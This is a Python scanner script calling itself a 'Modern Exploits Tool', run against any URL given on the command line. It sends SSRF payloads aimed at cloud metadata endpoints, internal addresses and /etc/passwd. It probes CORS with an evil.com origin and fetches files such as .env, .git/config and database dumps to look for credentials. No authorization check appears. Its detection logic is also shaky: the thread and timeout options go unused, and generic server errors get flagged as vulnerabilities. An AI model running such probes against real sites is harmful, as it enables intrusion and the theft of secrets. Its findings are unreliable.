#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import urllib3
import concurrent.futures
import argparse
import sys
import os
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

class ModernExploits:
    def __init__(self, target, threads=10):
        self.target = target
        self.threads = threads
        self.results = []
        self.vulnerable_urls = []
        self.total_scanned = 0
        self.vulnerabilities_found = 0
        
    def log_result(self, url, status, details=""):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if "VULNERABLE" in status:
            print(f"{Colors.GREEN}[{timestamp}] [VULN] {url}{Colors.RESET}")
            self.vulnerable_urls.append(url)
            self.vulnerabilities_found += 1
        elif "ERROR" in status:
            print(f"{Colors.RED}[{timestamp}] [ERROR] {url} - {details}{Colors.RESET}")
        elif "POTENTIAL" in status:
            print(f"{Colors.YELLOW}[{timestamp}] [POTENTIAL] {url} - {details}{Colors.RESET}")
        else:
            print(f"{Colors.BLUE}[{timestamp}] [SCAN] {url}{Colors.RESET}")
        
        self.results.append({
            'timestamp': timestamp,
            'url': url,
            'status': status,
            'details': details
        })
        self.total_scanned += 1

    def ssrf_exploits(self, url):
        """Test for SSRF vulnerabilities"""
        try:
            # Optimized SSRF payloads - most effective ones
            ssrf_payloads = [
                'http://localhost',
                'http://127.0.0.1',
                'http://169.254.169.254',  # AWS metadata
                'http://metadata.google.internal',  # GCP metadata
                'file:///etc/passwd',
                'http://192.168.1.1',
                'http://10.0.0.1'
            ]
            
            # Most common SSRF parameters
            params = [
                'url', 'link', 'redirect', 'return', 'callback', 'next', 
                'target', 'dest', 'path', 'file', 'image', 'api'
            ]
            
            print(f"{Colors.CYAN}[*] Testing {len(params)} key parameters with {len(ssrf_payloads)} SSRF payloads...{Colors.RESET}")
            
            # Test GET parameters with threading for speed
            def test_param(param):
                for payload in ssrf_payloads:
                    test_url = f"{url}?{param}={payload}"
                    try:
                        response = requests.get(test_url, timeout=5, verify=False, allow_redirects=False)
                        
                        # Quick SSRF indicators
                        response_text = response.text.lower()
                        if (response.status_code in [200, 301, 302, 400, 401, 403, 500] and 
                            any(indicator in response_text for indicator in ['localhost', '127.0.0.1', 'internal server error', 'connection refused'])):
                            self.log_result(test_url, "VULNERABLE - SSRF GET", f"Parameter: {param}, Status: {response.status_code}")
                            return True
                            
                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                        pass
                    except Exception:
                        pass
                return False
            
            # Test parameters sequentially but quickly
            vulnerable_found = False
            for i, param in enumerate(params):
                print(f"{Colors.BLUE}[*] Testing parameter: {param}{Colors.RESET}")
                if test_param(param):
                    vulnerable_found = True
                    break  # Stop if we found a vulnerability
                        
            # Test POST parameters quickly
            if not vulnerable_found:
                print(f"{Colors.CYAN}[*] Testing POST parameters...{Colors.RESET}")
                post_params = ['url', 'redirect', 'callback']
                
                for param in post_params:
                    for payload in ssrf_payloads[:3]:  # Top 3 payloads
                        try:
                            response = requests.post(url, data={param: payload}, timeout=5, verify=False)
                            
                            if response.status_code in [200, 301, 302, 400, 401, 403, 500]:
                                response_text = response.text.lower()
                                if any(indicator in response_text for indicator in ['localhost', '127.0.0.1', 'internal server error']):
                                    self.log_result(url, "VULNERABLE - SSRF POST", f"Parameter: {param}, Payload: {payload}")
                                    break
                                    
                        except Exception:
                            pass
                        
        except Exception as e:
            self.log_result(url, "ERROR", f"SSRF test failed: {str(e)}")

    def generate_modern_report(self):
        """Generate detailed report"""
        report_file = f"modern_exploits_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write("        MODERN EXPLOITS SCAN REPORT\n")
            f.write("=" * 60 + "\n")
            f.write(f"Target: {self.target}\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total URLs Scanned: {self.total_scanned}\n")
            f.write(f"Vulnerabilities Found: {self.vulnerabilities_found}\n")
            f.write("=" * 60 + "\n\n")
            
            if self.vulnerabilities_found > 0:
                f.write("VULNERABLE URLS:\n")
                f.write("-" * 40 + "\n")
                for vuln_url in self.vulnerable_urls:
                    f.write(f"• {vuln_url}\n")
                f.write("\n")
            
            f.write("DETAILED RESULTS:\n")
            f.write("-" * 40 + "\n")
            for result in self.results:
                f.write(f"[{result['timestamp']}] {result['status']} - {result['url']}\n")
                if result['details']:
                    f.write(f"    Details: {result['details']}\n")
        
        print(f"\n{Colors.GREEN}[+] Report saved to: {report_file}{Colors.RESET}")
        return report_file

    def test_cors_misconfiguration(self, url):
        """Test for CORS misconfiguration"""
        try:
            headers = {
                'Origin': 'https://evil.com',
                'Access-Control-Request-Method': 'GET',
                'Access-Control-Request-Headers': 'X-Requested-With'
            }
            
            response = requests.options(url, headers=headers, timeout=8, verify=False)
            
            cors_headers = response.headers.get('Access-Control-Allow-Origin', '')
            if cors_headers == '*' or cors_headers == 'https://evil.com':
                self.log_result(url, "VULNERABLE - CORS Misconfiguration", f"Allow-Origin: {cors_headers}")
                
            # Test with credentials
            headers['Access-Control-Allow-Credentials'] = 'true'
            response = requests.get(url, headers=headers, timeout=8, verify=False)
            
            if 'Access-Control-Allow-Credentials: true' in str(response.headers) and 'evil.com' in response.headers.get('Access-Control-Allow-Origin', ''):
                self.log_result(url, "VULNERABLE - CORS with Credentials", "Dangerous CORS configuration")
                
        except Exception as e:
            pass

    def test_security_headers(self, url):
        """Test for missing security headers"""
        try:
            response = requests.get(url, timeout=8, verify=False)
            headers = response.headers
            
            missing_headers = []
            security_headers = [
                'X-Content-Type-Options',
                'X-Frame-Options', 
                'X-XSS-Protection',
                'Strict-Transport-Security',
                'Content-Security-Policy',
                'X-Permitted-Cross-Domain-Policies'
            ]
            
            for header in security_headers:
                if header not in headers:
                    missing_headers.append(header)
            
            if len(missing_headers) > 3:  # If more than 3 headers are missing
                self.log_result(url, "POTENTIAL - Missing Security Headers", f"Missing: {', '.join(missing_headers)}")
                
        except Exception as e:
            pass

    def test_information_disclosure(self, url):
        """Test for information disclosure vulnerabilities"""
        try:
            # Test common info disclosure paths
            info_paths = [
                '/robots.txt',
                '/sitemap.xml',
                '/.git/config',
                '/.env',
                '/config.php.bak',
                '/web.config',
                '/phpinfo.php',
                '/info.php',
                '/test.php',
                '/.DS_Store',
                '/backup.zip',
                '/database.sql',
                '/wp-config.php.bak'
            ]
            
            for path in info_paths:
                test_url = url.rstrip('/') + path
                try:
                    response = requests.get(test_url, timeout=5, verify=False)
                    
                    if response.status_code == 200:
                        content = response.text.lower()
                        sensitive_indicators = [
                            'password', 'secret', 'key=', 'token', 'database=',
                            'mysql', 'postgresql', 'mongodb', 'redis',
                            'aws_access_key', 'api_key', 'private_key',
                            'connection_string', 'db_password'
                        ]
                        
                        if any(indicator in content for indicator in sensitive_indicators):
                            self.log_result(test_url, "VULNERABLE - Information Disclosure", f"Found sensitive data in {path}")
                        elif len(response.content) > 100:  # Significant content found
                            self.log_result(test_url, "POTENTIAL - Information Disclosure", f"Content found in {path}")
                            
                except:
                    pass
                    
        except Exception as e:
            pass

    def run_all_modern_exploits(self):
        """Run all modern exploit tests"""
        print(f"\n{Colors.CYAN}[*] Starting modern exploits scan for: {self.target}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Using {self.threads} threads{Colors.RESET}")
        
        # Test SSRF
        print(f"\n{Colors.YELLOW}[*] Testing SSRF vulnerabilities...{Colors.RESET}")
        self.ssrf_exploits(self.target)
        
        # Test CORS misconfiguration
        print(f"\n{Colors.YELLOW}[*] Testing CORS misconfiguration...{Colors.RESET}")
        self.test_cors_misconfiguration(self.target)
        
        # Test security headers
        print(f"\n{Colors.YELLOW}[*] Testing security headers...{Colors.RESET}")
        self.test_security_headers(self.target)
        
        # Test information disclosure
        print(f"\n{Colors.YELLOW}[*] Testing information disclosure...{Colors.RESET}")
        self.test_information_disclosure(self.target)
        
        # Generate report
        self.generate_modern_report()
        
        print(f"\n{Colors.CYAN}[*] Scan completed!{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Vulnerabilities found: {self.vulnerabilities_found}{Colors.RESET}")
        print(f"{Colors.BLUE}[+] Total URLs tested: {self.total_scanned}{Colors.RESET}")

def main():
    parser = argparse.ArgumentParser(description="Modern Exploits Testing Tool")
    parser.add_argument("-t", "--target", required=True, help="Target URL to scan")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (default: 10)")
    
    args = parser.parse_args()
    
    # Display banner
    print(f"""
{Colors.CYAN}{Colors.BOLD}
 ╔═══════════════════════════════════════════════════════════════╗
 ║                                                               ║
 ║                    Modern Exploits Tool                      ║
 ║                      Version 1.0.0                           ║
 ║                                                               ║
 ║  Testing for: SSRF, Modern Vulnerabilities                  ║
 ║                                                               ║
 ╚═══════════════════════════════════════════════════════════════╝
{Colors.RESET}
    """)
    
    # Validate target
    if not args.target.startswith(('http://', 'https://')):
        print(f"{Colors.RED}[!] Error: Target must start with http:// or https://{Colors.RESET}")
        sys.exit(1)
    
    try:
        scanner = ModernExploits(args.target, args.threads)
        scanner.run_all_modern_exploits()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[!] Unexpected error: {e}{Colors.RESET}")
        sys.exit(1)

if __name__ == '__main__':
    main()